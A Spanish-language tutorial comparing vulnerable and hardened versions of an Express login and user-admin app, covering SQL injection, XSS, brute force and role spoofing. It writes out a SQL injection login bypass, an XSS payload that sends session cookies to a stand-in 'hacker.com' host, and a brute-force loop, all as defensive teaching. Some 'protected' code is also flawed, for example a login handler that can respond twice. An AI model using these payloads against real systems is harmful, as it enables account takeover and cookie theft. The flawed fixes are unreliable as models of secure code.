# 🔍 Ejemplos Prácticos: Antes vs Después de Protecciones

## 1. SQL INJECTION - EJEMPLO PRÁCTICO

### ❌ ANTES (VULNERABLE)
```javascript
// server.js - Versión vulnerable
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    
    // ❌ VULNERABLE - Concatenación directa
    const query = `SELECT * FROM usuarios WHERE email = '${email}' AND password = '${password}'`;
    const result = await db.query(query);
    
    if (result.length > 0) {
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});
```

**Ataque de SQL Injection:**
```
email: admin' OR '1'='1
password: cualquier_cosa

Query resultante:
SELECT * FROM usuarios WHERE email = 'admin' OR '1'='1' AND password = 'cualquier_cosa'

Resultado: 
- Si '1'='1' siempre es true, el atacante accede como admin SIN CONTRASEÑA ❌
```

### ✅ AHORA (PROTEGIDO)
```javascript
// server.js - Versión protegida
const validateAndSanitizeLogin = [
    body('email')
        .trim()
        .isEmail()                    // ✅ Valida formato email
        .normalizeEmail()              // ✅ Normaliza email
        .isLength({ max: 100 })        // ✅ Limita longitud
        .withMessage('Correo inválido.'),
    body('password')
        .isLength({ min: 6, max: 100 }) // ✅ Rango validado
        .withMessage('Contraseña inválida.')
];

app.post('/api/login', validateAndSanitizeLogin, async (req, res) => {
    const { email, password } = req.body;
    
    // ✅ SEGURO - Prepared statements
    const [rows] = await pool.query(
        'SELECT id, email, password, rol FROM usuarios WHERE email = ?',
        [email]  // Parámetro separado - NUNCA se interpreta como SQL
    );
    
    if (rows.length > 0) {
        const hashedPassword = hashPassword(password);
        if (rows[0].password === hashedPassword) {
            res.json({ success: true });
        }
    }
    res.json({ success: false });
});
```

**Mismo ataque ahora:**
```
email: admin' OR '1'='1'
password: cualquier_cosa

¿Qué pasa?
1. Validación: "admin' OR '1'='1'" NO es un email válido
2. El servidor RECHAZA: "Correo inválido" ❌ BLOQUEADO

Incluso si pasara validación:
- Se buscaría literalmente un email con el valor "admin' OR '1'='1'"
- No coincide con ningún usuario real
- Resultado: Acceso denegado ❌ BLOQUEADO
```

---

## 2. XSS (CROSS-SITE SCRIPTING) - EJEMPLO PRÁCTICO

### ❌ ANTES (VULNERABLE)

**Frontend - app.js (línea antigua):**
```javascript
// ❌ VULNERABLE - innerHTML sin escapar
const tr = document.createElement('tr');
tr.innerHTML = `
    <td><strong>${user.id}</strong></td>
    <td>${user.email}</td>
    <td><span class="role-badge ${user.rol}">${user.rol}</span></td>
`;
adminTableBody.appendChild(tr);
```

**Backend - server.js (sin sanitización):**
```javascript
app.post('/api/users', async (req, res) => {
    const { email, password, rol } = req.body;
    
    // ❌ SIN SANITIZACIÓN - Almacena lo que sea
    await pool.query(
        'INSERT INTO usuarios (email, password, rol) VALUES (?, ?, ?)',
        [email, password, rol]  // Sin validar qué contiene
    );
});
```

**Ataque XSS:**
```
Admin crea un usuario con:
email: "><img src=x onerror="fetch('http://hacker.com/steal?data=' + document.cookie)">
password: test123
rol: Normal

¿Qué pasa?

1. Se almacena en BD: "><img src=x onerror=...
2. Al mostrar en tabla:
   tr.innerHTML = `<td>"><img src=x onerror="..."></td>`
   
3. El navegador interpreta el HTML:
   - Cierra el </td>
   - Crea un <img>
   - El evento onerror ejecuta: fetch('http://hacker.com/steal?cookie')
   
4. Resultado: ¡El cookie de sesión se envía a un servidor malicioso! ❌
```

### ✅ AHORA (PROTEGIDO)

**Backend - server.js (con sanitización):**
```javascript
const xss = require('xss');

// ✅ Función de sanitización
function sanitizeInput(input) {
    if (typeof input !== 'string') return input;
    return xss(input, {
        whiteList: {},         // ✅ Sin HTML permitido
        stripIgnoredTag: true  // ✅ Remover etiquetas
    });
}

// ✅ Validación con express-validator
const validateAndSanitizeUser = [
    body('email')
        .trim()
        .isEmail()                    // ✅ Debe ser email
        .normalizeEmail()
        .isLength({ max: 100 }),
    body('password')
        .isLength({ min: 6, max: 100 }),
    body('rol')
        .isIn(['Normal', 'Admin'])     // ✅ Solo valores permitidos
];

app.post('/api/users', validateAndSanitizeUser, async (req, res) => {
    const { email, password, rol } = req.body;
    
    // ✅ SANITIZAR antes de almacenar
    const sanitizedEmail = sanitizeInput(email);
    const hashedPassword = hashPassword(password);
    
    await pool.query(
        'INSERT INTO usuarios (email, password, rol) VALUES (?, ?, ?)',
        [sanitizedEmail, hashedPassword, rol]  // ✅ Limpio
    );
    
    // ✅ Enviar datos sanitizados al cliente
    res.json({
        success: true,
        users: data.map(u => ({
            ...u,
            email: sanitizeInput(u.email)  // ✅ Sanitizar antes de enviar
        }))
    });
});
```

**Frontend - app.js (con escapado):**
```javascript
// ✅ Función para escapar HTML
function escapeHTML(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

// ✅ Método seguro - Usar textContent y crear elementos
data.users.forEach(user => {
    const tr = document.createElement('tr');
    
    // Crear cada celda de forma segura
    const idCell = document.createElement('td');
    idCell.innerHTML = `<strong>${user.id}</strong>`;
    
    const emailCell = document.createElement('td');
    emailCell.textContent = user.email;  // ✅ textContent no ejecuta HTML
    
    const rolCell = document.createElement('td');
    const badge = document.createElement('span');
    badge.className = `role-badge ${user.rol}`;
    badge.textContent = user.rol;  // ✅ Seguro
    rolCell.appendChild(badge);
    
    tr.appendChild(idCell);
    tr.appendChild(emailCell);
    tr.appendChild(rolCell);
    
    adminTableBody.appendChild(tr);
});
```

**Mismo ataque ahora:**
```
Admin intenta crear usuario con:
email: "><img src=x onerror="alert('XSS')">
password: test123
rol: Normal

¿Qué pasa?

1. Validación: NO es email válido
   Servidor: "Correo inválido" ❌ RECHAZADO

2. Si saltara validación (otro campo):
   - Sanitización: `xss()` remueve la etiqueta img
   - Resultado: Solo se guarda parte válida de email

3. Si de alguna forma llegara a BD:
   - Se almacena: solo el texto limpio
   
4. Al mostrar en tabla:
   - Frontend usa: emailCell.textContent = user.email
   - textContent NUNCA interpreta HTML
   - Resultado: Se muestra como texto, sin ejecutar script ✅ BLOQUEADO
```

---

## 3. FUERZA BRUTA - EJEMPLO PRÁCTICO

### ❌ ANTES (SIN PROTECCIÓN)
```javascript
app.post('/api/login', async (req, res) => {
    // ❌ Sin rate limiting
    const { email, password } = req.body;
    // ... login logic ...
});

// Un atacante puede hacer:
for (let i = 0; i < 10000; i++) {
    await fetch('/api/login', {
        body: JSON.stringify({
            email: 'admin@umg.edu.gt',
            password: generateRandomPassword()
        })
    });
}
```

**Resultado:** El atacante puede probar 10,000 contraseñas sin restricción ❌

### ✅ AHORA (CON PROTECCIÓN)
```javascript
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // Ventana de 15 minutos
    max: 5,                    // Máximo 5 intentos
    message: 'Demasiados intentos. Intenta en 15 minutos.',
});

app.post('/api/login', loginLimiter, async (req, res) => {
    // ✅ Con rate limiting
    const { email, password } = req.body;
    // ... login logic ...
});
```

**Mismo ataque ahora:**
```
Intento 1: POST /api/login → 200 OK (Intento fallido)
Intento 2: POST /api/login → 200 OK (Intento fallido)
Intento 3: POST /api/login → 200 OK (Intento fallido)
Intento 4: POST /api/login → 200 OK (Intento fallido)
Intento 5: POST /api/login → 200 OK (Intento fallido)
Intento 6: POST /api/login → 429 Too Many Requests ❌ BLOQUEADO
           "Demasiados intentos. Intenta en 15 minutos."

Atacante debe esperar 15 minutos para probar de nuevo...
```

---

## 4. SUPLANTACIÓN DE IDENTIDAD - EJEMPLO PRÁCTICO

### ❌ ANTES (VULNERABLE)
```javascript
// Backend - Sin JWT
app.post('/api/login', async (req, res) => {
    const user = { email, rol: 'Normal' };
    res.json({
        success: true,
        user: user  // ✅ Enviado al cliente
    });
});

// Frontend - app.js
sessionStorage.setItem('userRole', data.user.rol);  // ❌ Guardado en cliente
```

**Ataque:**
```
1. Usuario normal inicia sesión
   sessionStorage.userRole = 'Normal'
   
2. El atacante abre DevTools en la consola:
   sessionStorage.setItem('userRole', 'Admin')
   
3. Ahora sessionStorage.userRole = 'Admin' ✅
   
4. Cuando se hace llamada a API:
   headers: { 'x-user-role': 'Admin' }  // Enviado desde DevTools
   
5. Servidor recibe y confía: 'x-user-role' === 'Admin'
   ACCESO OTORGADO ❌ ATACANTE ES AHORA ADMIN
```

### ✅ AHORA (PROTEGIDO - JWT)
```javascript
// Backend - Con JWT
function generateToken(user) {
    return jwt.sign(
        { id: user.id, email: user.email, rol: user.rol },
        JWT_SECRET,           // ✅ Clave secreta del servidor
        { expiresIn: '1h' }
    );
}

app.post('/api/login', async (req, res) => {
    const user = { id, email, rol: 'Normal' };
    const token = generateToken(user);  // ✅ Firmado con secreto
    
    res.json({
        success: true,
        token: token,  // ✅ Token criptográfico, no rol simple
        user: { email: user.email, rol: user.rol }
    });
});

// Middleware de verificación
function verifyToken(req, res, next) {
    const token = req.headers['authorization']?.split(' ')[1];
    try {
        const decoded = jwt.verify(token, JWT_SECRET);  // ✅ Verifica firma
        req.user = decoded;
        next();
    } catch (err) {
        res.status(401).json({ message: 'Token inválido' });
    }
}

app.get('/api/users', verifyToken, async (req, res) => {
    if (req.user.rol !== 'Admin') {  // ✅ Verificado desde token (confiable)
        return res.status(403).json({ message: 'Acceso denegado' });
    }
    // ...
});

// Frontend - app.js
sessionStorage.setItem('authToken', data.token);  // ✅ Token, no rol
```

**Mismo ataque ahora:**
```
1. Usuario normal inicia sesión
   Token: eyJhbGc... (firmado con JWT_SECRET)
   sessionStorage.authToken = token
   
2. El atacante abre DevTools:
   token = sessionStorage.getItem('authToken')
   // Token contiene rol: 'Normal'
   
   Intenta cambiar:
   sessionStorage.setItem('authToken', 'Admin')
   
3. Token modificado: 'Admin'
   
4. Envía al servidor:
   Authorization: Bearer Admin
   
5. Servidor verifica JWT:
   jwt.verify('Admin', JWT_SECRET)
   
   El token no está firmado con JWT_SECRET:
   ❌ "Token inválido"
   
6. ACCESO DENEGADO ✅ BLOQUEADO
```

**Por qué JWT es seguro:**
```
Token real:
{
  "id": 1,
  "email": "user@test.com",
  "rol": "Normal",
  "iat": 1234567890,
  "exp": 1234571490,
  "FIRMA": HMAC-SHA256(secreto)
}

Si alguien intenta cambiar "rol" a "Admin":
- Cambia el contenido del JSON
- Pero la FIRMA no coincide más
- El servidor rechaza: Token no válido ✅
```

---

## 5. VALIDACIÓN COMPLETA - COMPARACIÓN

| Escenario | ANTES | AHORA |
|-----------|-------|-------|
| SQL Injection en email | ❌ Usuario obtiene acceso | ✅ Correo inválido → rechazado |
| XSS en email | ❌ Script se ejecuta en panel | ✅ Script sanitizado → texto |
| Modificación de rol | ❌ Usuario se hace admin | ✅ Token no verifica → rechazado |
| Fuerza bruta (100 intentos) | ❌ 100 intentos posibles | ✅ 5 intentos, luego bloqueado |
| CSRF desde otro sitio | ❌ Cualquier origen aceptado | ✅ Solo localhost aceptado |
| XSS en toast messages | ❌ Mensaje malicioso ejecutado | ✅ Mensaje mostrado como texto |
| Payload de 1MB | ❌ Procesado normalmente | ✅ Rechazado (límite 10KB) |

---

## 6. RESUMEN: SEGURIDAD EN CAPAS

```
CAPA 1 - Headers HTTP (Helmet)
  └─ X-Content-Type-Options: nosniff
  └─ X-Frame-Options: DENY
  └─ X-XSS-Protection: 1; mode=block
  
CAPA 2 - Rate Limiting
  └─ 5 intentos de login por 15 minutos
  
CAPA 3 - Validación de Entrada (Express Validator)
  └─ Email válido
  └─ Contraseña 6-100 caracteres
  └─ Rol es Normal o Admin
  
CAPA 4 - Sanitización (XSS Library)
  └─ Remove etiquetas HTML
  └─ Remove event handlers
  
CAPA 5 - Prepared Statements (MySQL)
  └─ Parámetros separados del SQL
  └─ Imposible SQL Injection
  
CAPA 6 - Escapado en Frontend
  └─ Usar textContent no innerHTML
  └─ escapeHTML() para textos
  
CAPA 7 - JWT Tokens
  └─ Criptográficamente firmados
  └─ No pueden ser modificados
  
CAPA 8 - CORS Restrictivo
  └─ Solo localhost:3000
  └─ Solo métodos GET, POST
```

Cada capa añade seguridad. Incluso si una falla, las otras bloquean el ataque. 🛡️

---

**Última actualización:** 27 de Mayo de 2026
